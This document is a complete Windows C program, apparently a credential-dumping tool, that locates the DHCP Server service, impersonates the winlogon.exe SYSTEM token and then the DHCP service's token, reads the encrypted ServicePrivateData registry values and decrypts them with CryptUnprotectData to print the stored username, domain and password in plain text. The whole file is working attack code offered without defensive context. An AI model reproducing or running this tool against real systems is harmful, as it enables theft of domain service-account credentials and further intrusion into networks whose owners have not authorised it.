#include <Windows.h>
#include <tchar.h>
#include <Psapi.h>
#include <TlHelp32.h>

#pragma  comment(lib,"Crypt32.lib")

#define DHCP_KEY _T("SYSTEM\\CurrentControlSet\\Services\\DHCPServer\\ServicePrivateData")


DWORD FindDhcpServerPid(void)
{
	SC_HANDLE hServiceManager;
	hServiceManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (!hServiceManager)
	{
		_tprintf(_T("OpenSCManager() failed. Error code %d.\r\n"), GetLastError());
		return 0;
	}

	SC_HANDLE hServiceDhcpServer;
	hServiceDhcpServer = OpenService(hServiceManager, _T("DHCPServer"), SERVICE_QUERY_STATUS);
	if (!hServiceDhcpServer)
	{
		_tprintf(_T("OpenService() failed. Error code %d.\r\n"), GetLastError());
		CloseServiceHandle(hServiceManager);
		return 0;
	}

	BOOL bRes;
	SERVICE_STATUS_PROCESS sspData;
	DWORD dwBytesNeeded;
	bRes = QueryServiceStatusEx(
		hServiceDhcpServer,
		SC_STATUS_PROCESS_INFO,
		(LPBYTE)&sspData,
		sizeof(sspData),
		&dwBytesNeeded);
	if (!bRes)
	{
		_tprintf(_T("QueryServiceStatusEx() failed. Error code %d.\r\n"), GetLastError());
		CloseServiceHandle(hServiceDhcpServer);
		CloseServiceHandle(hServiceManager);
		return 0;
	}
	CloseServiceHandle(hServiceDhcpServer);
	CloseServiceHandle(hServiceManager);

	return sspData.dwProcessId;
}


BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		_tprintf(_T("[-] LookupPrivilegeValue error: %u\n"), GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		_tprintf(_T("[-] AdjustTokenPrivileges error: %u\n"), GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		_tprintf(_T("[-] The token does not have the specified privilege. %u\n"), GetLastError());
		return FALSE;
	}
	return TRUE;
}


DWORD getWinlogonPID(void)
{
	TCHAR strMsg[1024] = {0};
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (TRUE == Process32First(snapshot, &entry))
	{
		while (TRUE == Process32Next(snapshot, &entry))
		{
			if (0 == _tcscmp(entry.szExeFile, _T("winlogon.exe")))
			{
				_stprintf_s(strMsg, _countof(strMsg), _T("Winlogon PID: %d\r\n"), entry.th32ProcessID);
				_tprintf(strMsg);
				CloseHandle(snapshot);
				return entry.th32ProcessID;
			}
		}
	}
	CloseHandle(snapshot);
	return 0;
}


BOOL ImpersonateAsPidIdentity(DWORD dwPid)
{
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken;
	getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (!getCurrentToken)
	{
		_tprintf(_T("OpenProcessToken() Error  %u\n"), GetLastError());
		return FALSE;
	}
	if (!SetPrivilege(currentTokenHandle, SE_DEBUG_NAME) && !SetPrivilege(currentTokenHandle, SE_IMPERSONATE_NAME))
	{
		_tprintf(_T("SetPrivilege() Enable Error  %u\n"), GetLastError());
		return FALSE;
	}
	HANDLE processHandle;
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, dwPid);
	if (NULL == processHandle)
	{
		_tprintf(_T("OpenProcess Error %u\n"), GetLastError());
		return FALSE;
	}
	if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &tokenHandle))
	{
		_tprintf(_T("OpenProcessToken Error %u\n"), GetLastError());
		CloseHandle(processHandle);
		return FALSE;
	}
	SECURITY_IMPERSONATION_LEVEL seimp = SecurityImpersonation;
	TOKEN_TYPE tk = TokenPrimary;
	if (!DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, seimp, tk, &duplicateTokenHandle))
	{
		_tprintf(_T("DuplicateTokenEx Error %u\n"), GetLastError());
		CloseHandle(processHandle);
		CloseHandle(tokenHandle);
		return FALSE;
	}
	if (!ImpersonateLoggedOnUser(duplicateTokenHandle))
	{
		_tprintf(_T("Impersonate Logged On User Error %u\n"), GetLastError());
		CloseHandle(duplicateTokenHandle);
		CloseHandle(tokenHandle);
		CloseHandle(processHandle);
		return FALSE;
	}
	CloseHandle(duplicateTokenHandle);
	CloseHandle(tokenHandle);
	CloseHandle(processHandle);
	return TRUE;
}


PDATA_BLOB GetDhcpRegBlob(PTSTR pszKeyName)
{
	HKEY hKey;
	LSTATUS Status;
	DWORD dwValueSize = 0;
	PBYTE pBuf;
	PDATA_BLOB pDataBlob;

	pDataBlob = LocalAlloc(LPTR, sizeof(DATA_BLOB));
	if (NULL == pDataBlob)
	{
		_tprintf(_T("ERROR: Cannot allocate memory.\r\n"));
		return NULL;
	}

	Status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, DHCP_KEY, 0, KEY_READ, &hKey);
	if (ERROR_SUCCESS != Status)
	{
		_tprintf(_T("ERROR: RegOpenKeyEx() returned %lu\r\n"), Status);
		return NULL;
	}

	Status = RegQueryValueEx(
		hKey,
		pszKeyName,
		0,
		NULL,
		NULL,
		&dwValueSize);

	if (ERROR_SUCCESS != Status)
	{
		_tprintf(_T("ERROR: RegQueryValueEx(#1) returned %lu\r\n"), Status);
		RegCloseKey(hKey);
		return NULL;
	}

	//_tprintf(_T("Value size: %d\r\n"), dwValueSize);

	pBuf = LocalAlloc(LPTR, dwValueSize);
	if (NULL == pBuf)
	{
		_tprintf(_T("ERROR: Cannot allocate memory.\r\n"));
		RegCloseKey(hKey);
		return NULL;
	}

	Status = RegQueryValueEx(
		hKey,
		pszKeyName,
		0,
		NULL,
		pBuf,
		&dwValueSize);

	if (ERROR_SUCCESS != Status)
	{
		_tprintf(_T("ERROR: RegQueryValueEx(#2) returned %lu\r\n"), Status);
		RegCloseKey(hKey);
		return NULL;
	}

	RegCloseKey(hKey);
	pDataBlob->cbData = dwValueSize;
	pDataBlob->pbData = pBuf;
	return pDataBlob;
}


PWSTR DecryptBuf(PDATA_BLOB pDataBlobIn)
{
	DATA_BLOB DataBlobOut = {0};
	BOOL bRes;
	bRes = CryptUnprotectData(pDataBlobIn, NULL, NULL, NULL, NULL, 0, &DataBlobOut);
	if (!bRes)
	{
		_tprintf(_T("CryptUnprotectData() failed.\r\n"));
		return NULL;
	}

	PWSTR pwszPass;
	pwszPass = LocalAlloc(LPTR, DataBlobOut.cbData + sizeof(WCHAR));
	if (NULL == pwszPass)
	{
		_tprintf(_T("ERROR: Cannot allocate memory.\r\n"));
		return NULL;
	}
	RtlCopyMemory(pwszPass, DataBlobOut.pbData, DataBlobOut.cbData);
	// free?
	return pwszPass;
}


int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
{
	UNREFERENCED_PARAMETER(argc);
	UNREFERENCED_PARAMETER(argv);
	UNREFERENCED_PARAMETER(envp);
	
	DWORD dwDhcpServerPid;
	dwDhcpServerPid = FindDhcpServerPid();
	_tprintf(_T("DHCP Server PID: %d\r\n"), dwDhcpServerPid);
	if (0 == dwDhcpServerPid)
	{
		_tprintf(_T("Can't find DHCP Server PID. Exiting.\r\n"));
		return -1;
	}

	BOOL bRes;

	bRes = ImpersonateAsPidIdentity(getWinlogonPID());
	if (bRes)
	{
		_tprintf(_T("Impersonation #1 done.\r\n"));
	}
	else
	{
		_tprintf(_T("Impersonation #1 failed. Exiting\r\n"));
		return -2;
	}

	bRes = ImpersonateAsPidIdentity(dwDhcpServerPid);
	if (bRes)
	{
		_tprintf(_T("Impersonation #2 done.\r\n"));
	}
	else
	{
		_tprintf(_T("Impersonation #2 failed. Exiting\r\n"));
		return -3;
	}

	_tprintf(_T("\r\n"));

	PDATA_BLOB pDataBlob1;
	PWSTR pwszDecryptedData1;
	pDataBlob1 = GetDhcpRegBlob(_T("Param1"));
	pwszDecryptedData1 = DecryptBuf(pDataBlob1);
	_tprintf(_T("Username: \t%ls\r\n"), pwszDecryptedData1);

	PDATA_BLOB pDataBlob2;
	PWSTR pwszDecryptedData2;
	pDataBlob2 = GetDhcpRegBlob(_T("Param2"));
	pwszDecryptedData2 = DecryptBuf(pDataBlob2);
	_tprintf(_T("Domain: \t%ls\r\n"), pwszDecryptedData2);

	PDATA_BLOB pDataBlob3;
	PWSTR pwszDecryptedData3;
	pDataBlob3 = GetDhcpRegBlob(_T("Param3"));
	pwszDecryptedData3 = DecryptBuf(pDataBlob3);
	_tprintf(_T("Password: \t%ls\r\n"), pwszDecryptedData3);

	_tprintf(_T("\r\n"));

	_tprintf(_T("Done.\r\n"));
	return 0;
}
